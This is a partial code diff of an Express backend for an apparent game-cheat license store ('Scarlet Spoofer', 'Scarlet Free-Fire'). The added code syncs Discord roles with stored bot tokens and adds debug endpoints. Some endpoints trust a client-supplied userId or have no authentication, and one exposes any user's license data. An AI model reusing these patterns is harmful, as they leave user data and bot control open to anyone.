+        res.status(500).json({ message: "Erro ao adicionar membros em massa" });
+    }
+});
+
+// Delete Bot
+app.delete('/bots/:botDocId', async (req, res) => {
+    const { botDocId } = req.params;
+    const { userId } = req.body;
+
+    try {
+        const doc = await db.collection('discord_bots').doc(botDocId).get();
+        if (!doc.exists) return res.status(404).json({ message: "Bot não encontrado" });
+
+        // Verify ownership
+        if (doc.data().user_id !== String(userId)) {
+            return res.status(403).json({ message: "Sem permissão" });
+        }
+
+        await db.collection('discord_bots').doc(botDocId).delete();
+        res.json({ message: "Bot removido" });
+    } catch (e) {
+        console.error("Error deleting bot:", e);
+        res.status(500).json({ message: "Erro ao remover bot" });
+    }
+});
+
+// Sync Discord Roles based on user licenses
+app.post('/discord/sync-roles/:userId', async (req, res) => {
+    const { userId } = req.params;
+
+    try {
+        // Get user data
+        const userDoc = await db.collection('users').doc(String(userId)).get();
+        if (!userDoc.exists) {
+            return res.status(404).json({ message: "Usuário não encontrado" });
+        }
+
+        const userData = userDoc.data();
+
+        if (!userData.discord_id) {
+            return res.status(400).json({ message: "Usuário não tem Discord vinculado" });
+        }
+
+        // Constants
+        const SCARLET_GUILD_ID = '1332186483750211647';
+        const DEFAULT_ROLE_ID = '1431641793488752812';
+        const PRODUCT_ROLE_MAP = {
+            'Scarlet Menu': '1441087428730552432',
+            'Scarlet Spoofer': '1445603493544067154',
+            'Scarlet External': '1445850606915948606',
+            'Scarlet Roblox': '1445603841553727678',
+            'Scarlet Free-Fire': '1440538340683415604'
+        };
+
+        // Find bot with access to Scarlet server
+        const botSnapshot = await db.collection('discord_bots').get();
+        let scarletBotToken = null;
+
+        for (const botDoc of botSnapshot.docs) {
+            const botData = botDoc.data();
+            const guilds = botData.guilds_with_channels || botData.guilds || [];
+            const hasScarletGuild = guilds.some(g => g.id === SCARLET_GUILD_ID);
+
+            if (hasScarletGuild) {
+                scarletBotToken = decryptToken(botData.bot_token);
+                break;
+            }
+        }
+
+        if (!scarletBotToken) {
+            return res.status(500).json({ message: "Bot do servidor Scarlet não encontrado" });
+        }
+
+        // Get user licenses
+        const licensesSnapshot = await db.collection('licenses')
+            .where('user_id', '==', String(userId))
+            .get();
+
+        let licenses = licensesSnapshot.docs.map(doc => doc.data());
+        if (licenses.length === 0 && !isNaN(userId)) {
+            const licensesNumSnapshot = await db.collection('licenses')
+                .where('user_id', '==', Number(userId))
+                .get();
+            licenses = licensesNumSnapshot.docs.map(doc => doc.data());
+        }
+
+        // Collect roles to assign
+        const rolesToAssign = [DEFAULT_ROLE_ID];
+
+        for (const license of licenses) {
+            try {
+                const productDoc = await db.collection('products').doc(String(license.product_id)).get();
+                if (productDoc.exists) {
+                    const productName = productDoc.data().name;
+                    const roleId = PRODUCT_ROLE_MAP[productName];
+                    if (roleId && !rolesToAssign.includes(roleId)) {
+                        rolesToAssign.push(roleId);
+                    }
+                }
+            } catch (err) {
+                console.warn(`Could not fetch product ${license.product_id}:`, err);
+            }
+        }
+
+        // Assign roles
+        console.log(`🔄 Syncing ${rolesToAssign.length} roles for user ${userData.discord_username}...`);
+        const results = { success: [], failed: [] };
+
+        for (const roleId of rolesToAssign) {
+            try {
+                const assignRoleRes = await fetch(
+                    `https://discord.com/api/v10/guilds/${SCARLET_GUILD_ID}/members/${userData.discord_id}/roles/${roleId}`,
+                    {
+                        method: 'PUT',
+                        headers: { 'Authorization': `Bot ${scarletBotToken}` }
+                    }
+                );
+
+                if (assignRoleRes.ok || assignRoleRes.status === 204) {
+                    results.success.push(roleId);
+                    console.log(`  ✅ Role ${roleId} assigned`);
+                } else {
+                    results.failed.push({ roleId, status: assignRoleRes.status });
+                    console.warn(`  ⚠️ Failed to assign role ${roleId}: ${assignRoleRes.status}`);
+                }
+
+                // Delay to avoid rate limit
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (err) {
+                results.failed.push({ roleId, error: err.message });
+                console.error(`Error assigning role ${roleId}:`, err);
+            }
+        }
+
+        res.json({
+            message: "Sincronização concluída",
+            results: {
+                total: rolesToAssign.length,
+                success: results.success.length,
+                failed: results.failed.length,
+                details: results
+            }
+        });
+    } catch (e) {
+        console.error("Error syncing Discord roles:", e);
+        res.status(500).json({ message: "Erro ao sincronizar cargos" });
+    }
+});
+
+// DEBUG: List all bot guilds with IDs
+app.get('/debug/bot-guilds', async (req, res) => {
+    try {
+        const botSnapshot = await db.collection('discord_bots').get();
+        const allBotGuilds = [];
+
+        for (const botDoc of botSnapshot.docs) {
+            const botData = botDoc.data();
+            const guilds = botData.guilds_with_channels || botData.guilds || [];
+
+            allBotGuilds.push({
+                bot_id: botDoc.id,
+                bot_name: botData.bot_name,
+                guilds: guilds.map(g => ({
+                    id: g.id,
+                    name: g.name,
+                    channels: g.channels?.length || 0
+                }))
+            });
+        }
+
+        res.json({ bots: allBotGuilds });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// DEBUG: Check user licenses and product names
+app.get('/debug/user-licenses/:userId', async (req, res) => {
+    const { userId } = req.params;
+
+    try {
+        // Get user licenses
+        const licensesSnapshot = await db.collection('licenses')
+            .where('user_id', '==', String(userId))
+            .get();
+
+        let licenses = licensesSnapshot.docs.map(doc => doc.data());
+        if (licenses.length === 0 && !isNaN(userId)) {
+            const licensesNumSnapshot = await db.collection('licenses')
+                .where('user_id', '==', Number(userId))
+                .get();
+            licenses = licensesNumSnapshot.docs.map(doc => doc.data());
+        }
+
+        // Get product details
+        const productDetails = [];
+        for (const license of licenses) {
+            try {
+                const productDoc = await db.collection('products').doc(String(license.product_id)).get();
+                if (productDoc.exists) {
+                    const productData = productDoc.data();
+                    productDetails.push({
+                        product_id: license.product_id,
+                        product_name: productData.name,
+                        license: license
+                    });
+                }
+            } catch (err) {
+                productDetails.push({
+                    product_id: license.product_id,
+                    error: err.message
+                });
+            }
+        }
+
+        res.json({
+            user_id: userId,
+            total_licenses: licenses.length,
+            products: productDetails
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
     }
 });
 
@@ -1060,6 +2186,24 @@ app.post('/webhook/efi', async (req, res) => {
                 });
 
                 await paymentDoc.ref.update({ status: 'COMPLETED', paid_at: new Date().toISOString() });
+
+                // Log to Discord
+                try {
+                    const userDoc = await db.collection('users').doc(String(payment.user_id)).get();
+                    const productDoc = await db.collection('products').doc(String(payment.product_id)).get();
+
+                    discordLogger.logLicenseRedeemed({
+                        userId: payment.user_id,
+                        username: userDoc.exists ? userDoc.data().username : 'Unknown',
+                        productId: payment.product_id,
+                        productName: productDoc.exists ? productDoc.data().name : 'Unknown',
+                        planType: payment.plan_type,
+                        price: payment.amount,
+                        txid: txid
+                    }).catch(err => console.error('[LICENSE-LOG] Error:', err));
+                } catch (logError) {
+                    console.error('[LICENSE-LOG] Error fetching data:', logError);
+                }
             }
         } catch (e) { console.error("Webhook Error:", e); }
     }
